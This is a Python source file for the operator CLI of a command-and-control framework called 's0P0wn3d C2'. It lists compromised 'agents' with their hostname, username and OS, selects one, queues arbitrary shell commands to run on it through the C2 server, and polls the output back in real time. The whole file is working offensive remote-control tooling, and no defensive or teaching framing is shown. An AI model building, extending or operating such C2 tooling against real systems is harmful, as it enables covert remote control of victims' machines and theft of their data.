#!/usr/bin/env python3
"""
s0P0wn3d C2 - Operator CLI
"""

import requests
import json
import time
import readline
import os
import sys
from datetime import datetime
from pathlib import Path

# Configuration
C2_URL = "http://c2.s0p0wned.local:8443"
LOG_DIR = Path("logs")
LOG_FILE = LOG_DIR / f"cli_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

# Variables globales
current_agent = None
session_start = datetime.now()


def init_logs():
    """Initialise le système de logs"""
    LOG_DIR.mkdir(exist_ok=True)
    log(f"{'=' * 60}")
    log(f"CLI Session Started - {session_start.strftime('%Y-%m-%d %H:%M:%S')}")
    log(f"{'=' * 60}")


def log(message):
    """Écrit dans le fichier de log"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] {message}\n")


def print_banner():
    """Affiche le banner du C2"""
    banner = """
╔═══════════════════════════════════════════════════════════╗
║              s0P0wn3d C2 - Operator CLI                  ║
║                   Version 1.0 - MVP                       ║
╚═══════════════════════════════════════════════════════════╝
"""
    print(banner)
    print(f"[*] Server: {C2_URL}")
    print(f"[*] Logs: {LOG_FILE}")
    print(f"[*] Type 'help' for available commands\n")
    log("Banner displayed")


def format_time_ago(dt):
    """Formate un datetime en 'X ago'"""
    now = datetime.now()
    diff = now - dt

    seconds = diff.total_seconds()

    if seconds < 60:
        return f"{int(seconds)}s ago"
    elif seconds < 3600:
        return f"{int(seconds / 60)}m ago"
    elif seconds < 86400:
        return f"{int(seconds / 3600)}h ago"
    else:
        return f"{int(seconds / 86400)}d ago"


def draw_table(headers, rows):
    """Dessine un tableau ASCII simple"""
    if not rows:
        return "No data"

    # Calculer les largeurs de colonnes
    col_widths = [len(h) for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            col_widths[i] = max(col_widths[i], len(str(cell)))

    # Ligne du haut
    table = "┌"
    for width in col_widths:
        table += "─" * (width + 2) + "┬"
    table = table[:-1] + "┐\n"

    # Headers
    table += "│"
    for i, header in enumerate(headers):
        table += f" {header:<{col_widths[i]}} │"
    table += "\n"

    # Séparateur
    table += "├"
    for width in col_widths:
        table += "─" * (width + 2) + "┼"
    table = table[:-1] + "┤\n"

    # Lignes
    for row in rows:
        table += "│"
        for i, cell in enumerate(row):
            table += f" {str(cell):<{col_widths[i]}} │"
        table += "\n"

    # Ligne du bas
    table += "└"
    for width in col_widths:
        table += "─" * (width + 2) + "┴"
    table = table[:-1] + "┘"

    return table


def cmd_agents():
    """Liste tous les agents connectés"""
    try:
        log("Command: agents")
        response = requests.get(f"{C2_URL}/agents", timeout=5)
        data = response.json()

        agents = data.get("agents", {})

        if not agents:
            print("[!] No active agents")
            log("No agents found")
            return

        # Préparer les données pour le tableau
        headers = ["Agent ID", "Hostname", "Username", "OS", "Last Seen"]
        rows = []

        for agent_id, info in agents.items():
            last_seen = datetime.fromisoformat(info['last_seen'].replace('Z', '+00:00'))
            rows.append([
                agent_id,
                info.get('hostname', 'N/A'),
                info.get('username', 'N/A'),
                info.get('os', 'N/A'),
                format_time_ago(last_seen)
            ])

        print(f"\n[Active Agents: {len(agents)}]")
        print(draw_table(headers, rows))
        print()

        log(f"Listed {len(agents)} agent(s)")

    except requests.exceptions.RequestException as e:
        print(f"[-] Error connecting to server: {e}")
        log(f"ERROR: {e}")
    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_use(agent_id):
    """Sélectionne un agent"""
    global current_agent

    if not agent_id:
        print("[-] Usage: use <agent_id>")
        return

    # Vérifier que l'agent existe
    try:
        response = requests.get(f"{C2_URL}/agents", timeout=5)
        data = response.json()
        agents = data.get("agents", {})

        if agent_id not in agents:
            print(f"[-] Agent '{agent_id}' not found")
            print("[*] Use 'agents' to list available agents")
            log(f"Attempted to use non-existent agent: {agent_id}")
            return

        current_agent = agent_id
        print(f"[+] Selected agent: {agent_id}")
        log(f"Selected agent: {agent_id}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_shell(command):
    """Envoie une commande shell à l'agent sélectionné"""
    if not current_agent:
        print("[-] No agent selected. Use 'use <agent_id>' first")
        return

    if not command:
        print("[-] Usage: shell <command>")
        return

    try:
        payload = {
            "agent_id": current_agent,
            "type": "shell",
            "command": command
        }

        log(f"Sending command to {current_agent}: {command}")

        response = requests.post(
            f"{C2_URL}/command",
            json=payload,
            timeout=5
        )

        if response.status_code == 200:
            print(f"[+] Command queued for {current_agent}")
            print(f"[*] Command: {command}")
            print(f"[*] Tip: Use 'results' to see the output")
            log(f"Command queued successfully")
        else:
            print(f"[-] Server error: {response.status_code}")
            log(f"ERROR: Server returned {response.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_results(agent_id=None, auto_wait=False):
    """Affiche les résultats des commandes"""
    target = agent_id if agent_id else current_agent

    if not target:
        print("[-] No agent selected. Use 'use <agent_id>' or 'results <agent_id>'")
        return

    try:
        log(f"Requesting results for {target}")
        response = requests.get(f"{C2_URL}/results/{target}", timeout=5)

        if response.status_code == 404:
            if auto_wait:
                print(f"[-] No results yet for {target}. Waiting for agent beacon...")
                return
            print(f"[-] No results found for {target}")
            log(f"No results for {target}")
            return

        data = response.json()
        results_list = data.get("results", [])

        if not results_list:
            if auto_wait:
                print(f"[-] No results yet for {target}. Waiting for agent beacon...")
                return
            print(f"[-] No results yet for {target}")
            log(f"No results for {target}")
            return

        print(f"\n{'=' * 70}")
        print(f"[Results for {target}] - {len(results_list)} command(s)")
        print(f"{'=' * 70}\n")

        for i, result in enumerate(results_list, 1):
            timestamp = result.get('timestamp', 'N/A')
            command = result.get('command', 'N/A')
            output = result.get('output', '')

            print(f"[{i}] {timestamp}")
            print(f"┌─ Command: {command}")
            print(f"└─ Output:")
            # Indenter l'output pour plus de clarté
            for line in output.split('\n'):
                print(f"   {line}")
            print(f"{'-' * 70}\n")

        log(f"Displayed {len(results_list)} result(s) for {target}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_clear():
    """Efface l'écran"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()


def cmd_watch():
    """Surveille les résultats en temps réel"""
    if not current_agent:
        print("[-] No agent selected. Use 'use <agent_id>' first")
        return

    print(f"[*] Watching results for {current_agent}...")
    print(f"[*] Press Ctrl+C to stop\n")

    last_count = 0

    try:
        while True:
            response = requests.get(f"{C2_URL}/results/{current_agent}", timeout=5)

            if response.status_code == 200:
                data = response.json()
                results_list = data.get("results", [])

                # Afficher seulement les nouveaux résultats
                if len(results_list) > last_count:
                    for result in results_list[last_count:]:
                        timestamp = result.get('timestamp', 'N/A')
                        command = result.get('command', 'N/A')
                        output = result.get('output', '')

                        print(f"\n{'=' * 70}")
                        print(f"[NEW] {timestamp}")
                        print(f"┌─ Command: {command}")
                        print(f"└─ Output:")
                        for line in output.split('\n'):
                            print(f"   {line}")
                        print(f"{'=' * 70}\n")

                    last_count = len(results_list)

            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[*] Stopped watching")
        log("Watch mode stopped")


def cmd_help():
    """Affiche l'aide"""
    help_text = """
Available Commands:
──────────────────────────────────────────────────────────
  agents              List all connected agents
  use <agent_id>      Select an agent to interact with
  shell <command>     Execute shell command on selected agent
  results [agent_id]  Show command results (current or specified agent)
  watch               Auto-refresh results in real-time (Ctrl+C to stop)
  clear               Clear screen
  help                Show this help message
  exit                Exit the CLI

Examples:
──────────────────────────────────────────────────────────
  agents                    # List all agents
  use TEST_C                # Select agent TEST_C
  shell whoami              # Run 'whoami' on selected agent
  shell dir C:\\Users       # Run 'dir C:\\Users'
  results                   # Show results for current agent
  watch                     # Auto-refresh results every 2s
  results TEST_C            # Show results for specific agent

Tips:
──────────────────────────────────────────────────────────
  - Use arrow keys (↑/↓) to navigate command history
  - All commands are logged to: {0}
  - Use 'watch' mode to see results as they arrive
  - Press Ctrl+C or type 'exit' to quit
""".format(LOG_FILE)

    print(help_text)
    log("Help displayed")


def cmd_exit():
    """Quitte la CLI"""
    log("CLI session ended")
    log(f"{'=' * 60}\n")
    print("\n[*] Goodbye!")
    sys.exit(0)


def get_prompt():
    """Retourne le prompt approprié"""
    if current_agent:
        return f"c2({current_agent})> "
    return "c2> "


def setup_readline():
    """Configure readline pour l'historique"""
    # Créer le fichier d'historique
    history_file = LOG_DIR / ".cli_history"

    try:
        readline.read_history_file(history_file)
    except FileNotFoundError:
        pass

    # Sauvegarder l'historique à la sortie
    import atexit
    atexit.register(readline.write_history_file, history_file)

    # Configurer l'auto-complétion (basique)
    readline.parse_and_bind("tab: complete")


def main():
    """Boucle principale de la CLI"""
    init_logs()
    setup_readline()
    print_banner()

    # Vérifier la connexion au serveur
    try:
        response = requests.get(f"{C2_URL}/", timeout=2)
        print("[+] Connected to C2 server")
        print("[!] IMPORTANT: Run server with 'python3 server.py' (silent mode)\n")
        log("Connected to C2 server")
    except Exception as e:
        print(f"[-] Cannot connect to C2 server: {e}")
        print(f"[*] Make sure the server is running on {C2_URL}")
        log(f"ERROR: Cannot connect to server: {e}")
        return

    # Boucle principale
    while True:
        try:
            user_input = input(get_prompt()).strip()

            if not user_input:
                continue

            # Parser la commande
            parts = user_input.split(maxsplit=1)
            cmd = parts[0].lower()
            args = parts[1] if len(parts) > 1 else ""

            # Router les commandes
            if cmd == "agents":
                cmd_agents()
            elif cmd == "use":
                cmd_use(args)
            elif cmd == "shell":
                cmd_shell(args)
            elif cmd == "results":
                cmd_results(args if args else None)
            elif cmd == "watch":
                cmd_watch()
            elif cmd == "clear":
                cmd_clear()
            elif cmd == "help":
                cmd_help()
            elif cmd in ["exit", "quit"]:
                cmd_exit()
            else:
                print(f"[-] Unknown command: {cmd}")
                print("[*] Type 'help' for available commands")
                log(f"Unknown command: {cmd}")

        except KeyboardInterrupt:
            print("\n[!] Use 'exit' to quit")
            log("Received Ctrl+C")
        except EOFError:
            cmd_exit()
        except Exception as e:
            print(f"[-] Error: {e}")
            log(f"ERROR: {e}")


if __name__ == "__main__":
    main()